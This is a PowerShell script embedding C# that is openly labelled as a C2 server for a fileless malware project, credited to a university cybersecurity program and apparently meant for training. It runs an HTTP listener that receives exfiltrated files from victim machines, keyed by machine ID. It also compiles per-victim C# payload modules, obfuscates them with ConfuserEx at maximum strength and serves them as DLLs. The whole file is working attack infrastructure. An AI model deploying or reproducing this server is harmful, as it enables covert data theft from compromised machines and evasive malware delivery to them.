# =============================================================================
# Project Name: FilelessGaia
# File: gaia_server.ps1
# Description: C2 Server for the Orion Project
#
# Copyright (c) 2026 Christophe SUBLET, Grenoble INP - Esisar, UGA, CyberSkills@UGA
#
# This file is part of FilelessGaia
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# =============================================================================

$CSharpCode = @"
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Xml.Linq;
using Microsoft.CSharp;
using System.Diagnostics;
using System.CodeDom.Compiler;

public class FileUploadServer
{
    public static void Main()
    {
        string url = "http://+:4585/";
        HttpListener listener = new HttpListener();
        listener.Prefixes.Add(url);
        listener.Start();

        Console.WriteLine("Server started at {0}", url);

        while (true)
        {
            var context = listener.GetContext();
            System.Threading.ThreadPool.QueueUserWorkItem(_ => Handle(context));
        }
    }

    private static void Handle(HttpListenerContext context)
    {
        try
        {
            var request = context.Request;
            var path = request.Url.AbsolutePath;

            if (IsUploadRequest(request, path))
            {
                HandleUpload(context);
                return;
            }

            if (IsModuleRequest(request, path))
            {
                HandleModule(context);
                return;
            }

            context.Response.StatusCode = 404;
            context.Response.Close();
        }
        catch (Exception ex)
        {
            Console.WriteLine("ERROR: " + ex.Message);
        }
    }

    private static bool IsUploadRequest(HttpListenerRequest request, string path)
    {
        return request.HttpMethod == "POST"
            && path.StartsWith("/gadfTs55sghsSSS/")
            && path.EndsWith("/123.txt");
    }

    private static bool IsModuleRequest(HttpListenerRequest request, string path)
    {
        return request.HttpMethod == "GET"
            && path == "/gadfTs55sghsSSS/phppost.php";
    }

    private static void HandleUpload(HttpListenerContext context)
    {
        var request = context.Request;
        var response = context.Response;

        string machineId = GetMachineId(request.Url.AbsolutePath);
        if (machineId == null)
        {
            response.StatusCode = 400;
            response.Close();
            return;
        }

        string boundary = GetBoundary(request.ContentType);
        if (boundary == null)
        {
            response.StatusCode = 400;
            response.Close();
            return;
        }

        byte[] boundaryBytes = Encoding.UTF8.GetBytes(boundary);

        string headers = ReadMultipartHeaders(request.InputStream);
        string fileName = ExtractFileName(headers);

        string filePath = PrepareFilePath(machineId, fileName);

        SaveMultipartFile(request.InputStream, filePath, boundaryBytes);

        WriteOk(response);

        Console.WriteLine("[UPLOAD] {0} -> {1}", machineId, fileName);
    }

    private static void HandleModule(HttpListenerContext context)
    {
        var request = context.Request;
        var response = context.Response;
        string machineId = GetMachineIdFromQuery(request);
        if (machineId == null)
        {
            response.StatusCode = 400;
            response.Close();
            return;
        }

        string source = BuildModule(machineId);
        byte[] dll = CompileModule(source);
        if (dll == null)
        {
            response.StatusCode = 500;
            response.Close();
            return;
        }

        response.ContentType = "application/octet-stream";
        response.OutputStream.Write(dll, 0, dll.Length);
        response.Close();
    }

    private static string GetMachineIdFromQuery(HttpListenerRequest request)
    {
        return request.QueryString["id"];
    }

    private static string BuildModule(string machineId)
    {
        var apiKey = "test";
        string moduleCode = File.ReadAllText("module1.cs");
        moduleCode = moduleCode.Replace("{MachineId}", machineId);
        moduleCode = moduleCode.Replace("{ApiKey}", apiKey);
        return moduleCode;
    }

    private static byte[] CompileModule(string sourceCode)
    {
        CSharpCodeProvider provider = new CSharpCodeProvider();

        CompilerParameters parameters = new CompilerParameters();
        parameters.GenerateExecutable = false;
        parameters.GenerateInMemory = false;
        parameters.TreatWarningsAsErrors = false;
        parameters.CompilerOptions = "/optimize";
        parameters.GenerateExecutable = false;
        parameters.ReferencedAssemblies.Add("System.dll");
        parameters.ReferencedAssemblies.Add("mscorlib.dll");
        parameters.ReferencedAssemblies.Add("System.IO.dll");
        parameters.ReferencedAssemblies.Add("System.Net.dll");
        parameters.ReferencedAssemblies.Add("System.Core.dll");
        // parameters.ReferencedAssemblies.Add("netstandard.dll");
        parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
        // parameters.ReferencedAssemblies.Add("System.Runtime.dll");
        parameters.ReferencedAssemblies.Add("System.Management.dll");
        parameters.ReferencedAssemblies.Add("System.Net.Sockets.dll");
        parameters.ReferencedAssemblies.Add("System.Collections.dll");
        parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
        parameters.ReferencedAssemblies.Add("System.Threading.Tasks.dll");
        // parameters.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
        parameters.ReferencedAssemblies.Add("System.IO.Compression.ZipFile.dll");
        // parameters.ReferencedAssemblies.Add("System.Diagnostics.EventLog.dll");
        // parameters.ReferencedAssemblies.Add("System.Security.Cryptography.dll");
        parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");

        string tempDll = Path.GetTempFileName() + ".dll";
        parameters.OutputAssembly = tempDll;

        CompilerResults results = provider.CompileAssemblyFromSource(parameters, sourceCode);

        if (results.Errors.HasErrors)
        {
            foreach (CompilerError error in results.Errors)
            {
                Console.WriteLine("Erreur {0}: {1} à la ligne {2}", error.ErrorNumber, error.ErrorText, error.Line);
            }
            return null;
        }

        var tempDll2 = Obfuscator(tempDll);
        File.Delete(tempDll);
        byte[] dllBytes = File.ReadAllBytes(tempDll2);
        File.Delete(tempDll2);

        return dllBytes;
    }

    private static string Obfuscator(string filePath)
    {
        string baseDir = Path.GetDirectoryName(filePath);
        string fileName = Path.GetFileName(filePath);
        string outputDir = Path.Combine(baseDir, "protected");
        Directory.CreateDirectory(outputDir);

        XNamespace ns = "http://confuser.codeplex.com";
        var project = new XElement(ns + "project", new XAttribute("outputDir", outputDir), new XAttribute("baseDir", baseDir), new XElement(ns + "module", new XAttribute("path", filePath), new XElement(ns + "rule", new XAttribute("pattern", "true"), new XAttribute("preset", "maximum"), new XAttribute("inherit", "false"))));

        string configPath = Path.Combine(outputDir, "project.crproj");
        new XDocument(project).Save(configPath);

        Process process = new Process();
        process.StartInfo.FileName = "obfuscator\\Confuser.CLI.exe";
        process.StartInfo.Arguments = configPath;

        process.StartInfo.RedirectStandardOutput = true;  
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.Start();

        string output = process.StandardOutput.ReadToEnd();
        Console.WriteLine(output);
        process.WaitForExit();

        return Path.Combine(outputDir, fileName);
    }

    private static string GetMachineId(string path)
    {
        var parts = path.Split('/');
        if (parts.Length < 4) return null;
        return parts[2];
    }

    private static string GetBoundary(string contentType)
    {
        if (contentType == null || !contentType.Contains("boundary="))
            return null;

        return "\r\n--" + contentType.Split(new string[] { "boundary=" }, StringSplitOptions.None)[1].Trim('"') + "--\r\n";
    }

    private static string ReadMultipartHeaders(Stream input)
    {
        MemoryStream buffer = new MemoryStream();
        int prev = 0, cur;

        while ((cur = input.ReadByte()) != -1)
        {
            buffer.WriteByte((byte)cur);

            if (prev == 13 && cur == 10)
            {
                byte[] temp = buffer.ToArray();
                if (EndsWith(temp, new byte[] { 13, 10, 13, 10 }))
                    break;
            }
            prev = cur;
        }

        return Encoding.UTF8.GetString(buffer.ToArray());
    }

    private static string ExtractFileName(string headers)
    {
        string fileName = "file.bin";
        int fnIndex = headers.IndexOf("filename=");

        if (fnIndex >= 0)
        {
            int start = fnIndex + 9;
            int end = headers.IndexOf(";", start);
            if (end < 0) {
                end = headers.IndexOf("\n", start);
            }
            fileName = headers.Substring(start, end - start).Trim('"');
        }

        return fileName;
    }

    private static string PrepareFilePath(string machineId, string fileName)
    {
        string dir = Path.Combine("uploads", machineId);
        Directory.CreateDirectory(dir);
        return Path.Combine(dir, fileName);
    }

    private static void SaveMultipartFile(Stream input, string filePath, byte[] boundaryBytes)
    {
        using (FileStream output = new FileStream(filePath, FileMode.Create))
        {
            byte[] buffer = new byte[8192];
            MemoryStream carry = new MemoryStream();

            int bytesRead;
            while ((bytesRead = input.Read(buffer, 0, buffer.Length)) > 0)
            {
                carry.Write(buffer, 0, bytesRead);

                if (ProcessBuffer(carry, output, boundaryBytes))
                    break;
            }
        }
    }

    private static bool ProcessBuffer(MemoryStream carry, FileStream output, byte[] boundaryBytes)
    {
        byte[] data = carry.ToArray();

        int scanIndex = 0;

        while (scanIndex < data.Length)
        {
            int newlineIndex = FindNewLine(data, scanIndex);
            if (newlineIndex == -1)
                break;

            int remaining = data.Length - newlineIndex;

            if (remaining < boundaryBytes.Length)
            {
                output.Write(data, 0, newlineIndex);
                ShiftBuffer(carry, data, newlineIndex);
                return false;
            }

            Console.WriteLine("data: " + BitConverter.ToString(data));
            if (MatchBoundary(data, newlineIndex, boundaryBytes))
            {
                Console.WriteLine("data: " + Encoding.UTF8.GetString(data));
                output.Write(data, 0, newlineIndex);
                return true;
            }

            scanIndex = newlineIndex + 1;
        }

        int safeLength = data.Length - boundaryBytes.Length;
        if (safeLength > 0)
        {
            output.Write(data, 0, safeLength);
            ShiftBuffer(carry, data, safeLength);
        }

        return false;
    }

    private static void WriteOk(HttpListenerResponse response)
    {
        byte[] ok = Encoding.UTF8.GetBytes("OK");
        response.OutputStream.Write(ok, 0, ok.Length);
        response.Close();
    }

    private static int FindNewLine(byte[] data, int start)
    {
        for (int i = start; i < data.Length - 1; i++)
            if (data[i] == (byte)'\r' && data[i + 1] == (byte)'\n')
                return i;
        return -1;
    }

    private static bool MatchBoundary(byte[] data, int index, byte[] boundary)
    {
        Console.WriteLine("Size: {0} {1}", index + boundary.Length, data.Length);
        if (index + boundary.Length > data.Length)
            return false;

        byte[] slice = new byte[boundary.Length];
        Array.Copy(data, index, slice, 0, boundary.Length);
        Console.WriteLine("Content: {0} {1}", BitConverter.ToString(slice), BitConverter.ToString(boundary));
        for (int i = 0; i < boundary.Length; i++)
            if (data[index + i] != boundary[i])
                return false;

        return true;
    }

    private static void ShiftBuffer(MemoryStream stream, byte[] data, int offset)
    {
        stream.SetLength(0);
        stream.Write(data, offset, data.Length - offset);
    }

    private static bool EndsWith(byte[] data, byte[] suffix)
    {
        if (data.Length < suffix.Length) return false;
        for (int i = 0; i < suffix.Length; i++)
            if (data[data.Length - suffix.Length + i] != suffix[i])
                return false;
        return true;
    }

    private static int IndexOf(byte[] data, byte[] pattern)
    {
        for (int i = 0; i <= data.Length - pattern.Length; i++)
        {
            bool match = true;
            for (int j = 0; j < pattern.Length; j++)
            {
                if (data[i + j] != pattern[j])
                {
                    match = false;
                    break;
                }
            }
            if (match) return i;
        }
        return -1;
    }
}
"@

Add-Type -TypeDefinition $CSharpCode
[FileUploadServer]::Main()